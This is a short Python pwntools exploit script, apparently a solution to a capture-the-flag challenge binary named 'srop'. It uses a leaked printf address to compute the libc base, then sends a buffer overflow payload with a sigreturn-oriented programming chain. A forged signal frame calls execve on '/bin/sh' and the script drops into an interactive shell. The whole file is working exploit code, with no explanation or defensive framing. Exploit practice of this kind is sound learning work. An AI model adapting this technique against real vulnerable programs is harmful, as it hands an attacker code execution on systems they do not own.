from pwn import *

context.arch = 'amd64'

elf = ELF('./srop')
libc = elf.libc

p = process(elf.path)

def db(p):
    gdb.attach(p, gdbscript='')
    pause()

p.recvuntil(':')
printf = int(p.recvuntil('\n', drop=True), 16)
libc_base = printf - libc.symbols['printf']
log.info(f'libc_base: {libc_base:x}')
libc.address = libc_base

rop = ROP(libc)
syscall = rop.syscall.address
pop_rax = rop.rax.address

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(libc.search(b'/bin/sh\x00'))
# frame.rsi = 0
# frame.rdx = 0
# frame.rsp = 0xdeadbeef
frame.rip = syscall

# db(p)

pay = cyclic(cyclic_find(0x6161617461616173))
pay += flat(pop_rax, constants.SYS_rt_sigreturn, syscall)
pay += bytes(frame)

p.send(pay)

p.interactive()